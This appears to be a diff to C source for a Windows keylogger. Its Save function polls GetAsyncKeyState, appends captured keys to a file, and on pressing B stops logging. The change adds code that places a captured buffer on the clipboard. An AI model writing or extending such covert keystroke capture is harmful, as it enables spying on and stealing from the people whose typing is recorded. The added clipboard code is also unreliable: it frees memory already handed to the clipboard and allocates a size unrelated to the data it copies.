@@ -32,6 +32,7 @@ int main(void){
 
 int Save(int _key, char *file){
     Sleep(10);
+    HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, 7*50);
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen(file, "a+");
     fprintf(OUTPUT_FILE, "START\n");
@@ -48,6 +49,13 @@ int Save(int _key, char *file){
             int keyState = GetAsyncKeyState(i);
             if ((keyState & 0x8000) && (i == 0x42)){
                 fprintf(OUTPUT_FILE, "END\n");
+                memcpy(GlobalLock(hMem), allocConvert, sizeof(allocConvert));
+                GlobalUnlock(hMem);
+                OpenClipboard(0);
+                EmptyClipboard();
+                SetClipboardData(CF_TEXT, hMem);
+                CloseClipboard();
+                GlobalFree(hMem);
                 fclose(OUTPUT_FILE);
                 break;
             }
